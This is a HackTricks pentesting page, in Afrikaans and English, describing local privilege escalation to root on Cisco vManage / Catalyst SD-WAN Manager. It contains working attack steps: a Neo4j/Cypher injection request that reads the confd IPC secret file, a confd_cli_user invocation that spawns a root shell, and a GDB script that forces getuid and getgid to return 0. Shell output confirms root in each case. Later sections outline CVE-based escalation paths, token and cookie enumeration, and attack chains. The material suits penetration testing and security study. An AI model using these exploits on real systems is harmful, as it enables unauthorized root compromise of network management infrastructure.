# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Sodra jy code execution op Cisco vManage / *Catalyst SD-WAN Manager* as `vmanage`, `netadmin`, of `vmanage-admin` het, is die interessantste local privesc-oppervlaktes gewoonlik die `confd` CLI stack, die `cmdptywrapper` helper, localhost REST APIs, en root-owned import/upload handlers.

As jy steeds die **initial foothold** op ’n controller nodig het, kyk eers na die toegewyde control-plane-bladsy:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
As `/etc/confd/confd_ipc_secret` leesbaar is vanaf jou foothold, word Path 1 en Path 2 onmiddellik prakties.

## Path 1

(Voorbeeld uit [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nadat ons ’n bietjie deur sommige [documentation](http://66.218.245.39/doc/html/rn03re18.html) gewerk het wat verband hou met `confd` en die verskillende binaries (toeganklik met ’n account op die Cisco website), het ons gevind dat om die IPC socket te authenticate, dit ’n secret gebruik wat in `/etc/confd/confd_ipc_secret` geleë is:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Onthou jy ons Neo4j-instansie? Dit loop onder die `vmanage` gebruiker se voorregte, en laat ons dus toe om die lêer te herwin met die vorige kwesbaarheid:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Die `confd_cli` program ondersteun nie command line arguments nie maar roep `/usr/bin/confd_cli_user` met arguments aan. So, ons kan direk `/usr/bin/confd_cli_user` met ons eie stel arguments aanroep. Dit is egter nie leesbaar met ons huidige privileges nie, so ons moet dit uit die rootfs haal en dit met scp kopieer, die help lees, en dit gebruik om die shell te kry:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pad 2

(Voorbeeld van [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Die blog¹ deur die synacktiv-span het ’n elegante manier beskryf om ’n root shell te kry, maar die nadeel is dat dit vereis om ’n kopie van die `/usr/bin/confd_cli_user` te kry, wat slegs deur root leesbaar is. Ek het ’n ander manier gevind om na root te escaleer sonder so ’n moeite.

Toe ek die `/usr/bin/confd_cli` binary gedisassembleer het, het ek die volgende waargeneem:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Toe ek “ps aux” uitvoer, het ek die volgende waargeneem (_let wel -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ek het die veronderstelling gemaak dat die “confd_cli” program die user ID en group ID wat dit van die aangemelde user versamel, aan die “cmdptywrapper” application deurgee.

My eerste poging was om die “cmdptywrapper” direk te run en dit van `-g 0 -u 0` te voorsien, maar dit het gefaal. Dit lyk asof ’n file descriptor (-i 1015) iewers langs die pad created is en ek kan dit nie fake nie.

Soos genoem in synacktiv se blog(last example), ondersteun die “confd_cli” program nie command line argument nie, maar ek kan dit met ’n debugger influence en gelukkig is GDB op die system included.

Ek het ’n GDB script gemaak waar ek die API `getuid` en `getgid` gedwing het om 0 terug te gee. Aangesien ek reeds “vmanage” privilege through the deserialization RCE het, het ek toestemming om die `/etc/confd/confd_ipc_secret` direk te lees.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Konsole-uitset</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pad 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco het later ’n skoner plaaslike root-pad in sy eie advisory vir [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) gedokumenteer: ’n **geauthentiseerde aanvaller met slegs lees-alleen-privileges** kon ’n vervaardigde request na die manager CLI stuur en na root spring weens onvoldoende input validation.

Van ’n offensiewe perspektief is dit die belangrike takeaway:

1. Sodra jy *enige* lae-priv foothold op die box het, moet jy die local CLI service toets voordat jy vir die swaarder Pad 1 / Pad 2 workflow gaan.
2. Hergebruik die artifacts van Pad 2 om die trust boundary te vind: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Behandel elke field wat na die CLI backend deurgestuur word as verdag: UID/GID, username, terminal metadata, imported files, of enige value wat later deur ’n root-owned helper verbruik word.
4. As ’n lae-priv user die local CLI socket kan bereik en daardie fields kan beïnvloed, kan root dalk net een vervaardigde request weg wees.

’n Praktiese workflow nadat jy op die appliance geland het, is:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Dit verander die 2025-bug in ’n goeie hunting pattern vir soortgelyke weergawes: soek vir **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco se Februarie 2026 advisory het ook nog ’n nuttige privesc-klas ingestel: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) het ’n **authenticated, local attacker with low privileges** toegelaat om root te kry as gevolg van ’n onvoldoende user-authentication mechanism in die REST API.

Dit maak saak omdat vManage privesc nie meer beperk is tot `confd`/TTY abuse nie. Na ’n low-priv shell, soek ook na:

- localhost-only API endpoints that trust the caller too much
- tokens, cookies, or service credentials readable from the current account
- root-only actions exposed through `dataservice`/REST handlers that can still be triggered locally

In practice, once you have a shell as `vmanage` or another service user, local API abuse is often quieter and easier to automate than interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
As die plaaslike sessie-konteks genoeg is om bevoorregte REST-funksionaliteit te bereik, verkies die API-pad: dit is makliker om te herhaal, te skryf as ’n script, en te ketting met gesteelde websessies of API-tokens.

## Pad 5 (2026 crafted file verwerk deur root - CVE-2026-20245)

Nog ’n onlangse patroon is [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): ’n plaaslike aanvaller met `netadmin`-regte kon ’n **crafted file** oplaai wat die CLI later onveilig hanteer het, wat gelei het tot command injection as `root`.

Uit ’n HackTricks-oogpunt is die waardevolle tegniek breër as die spesifieke CVE:

1. Tel elke CLI- of web-workflow op wat ’n lêer aanvaar: imports, diagnostic bundles, templates, validators, backups, tenant data, ens.
2. Volg waar die opgelaaide lêer beland en watter root-owned script of binary dit verbruik.
3. Toets of die lêernaam, lêerinhoud, of geparste metadata ooit na shell commands, wrapper scripts, of `system()`-style helpers deurgegee word.
4. As jy reeds `netadmin` kan bereik (geldige creds, gesteelde sessie, of ’n auth-bypass chain), is file-processing bugs dikwels die vinnigste pad na root.

Hierdie bug-klas ketting veral goed met remote footholds wat `netadmin` gee maar nie `root` nie.

## Ander onlangse vManage/Catalyst SD-WAN Manager vulns om te ketting

- **Authenticated UI XSS (CVE-2024-20475)** – Steel ’n admin-sessie in die web UI, en pivot dan na API/CLI actions wat uiteindelik by `vshell` of een van die plaaslike privesc-paaie hierbo uitkom.
- **Remote auth bypass na `netadmin` (CVE-2026-20129)** – Baie sterk voorloper vir Pad 5 omdat `netadmin` presies die vlak is wat vir die 2026 crafted-file privesc vereis word.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Nuttig om lêers te laat val wat later deur bevoorregte komponente gepars word of om operasionele artefakte te oorskryf wat deur root-owned helpers verbruik word.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Beter gedokumenteer in die toegewyde SD-WAN control-plane bladsy; dit kan ’n SSH key vir `vmanage-admin` byvoeg, wat jou die plaaslike foothold gee wat nodig is om na hierdie bladsy terug te keer.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
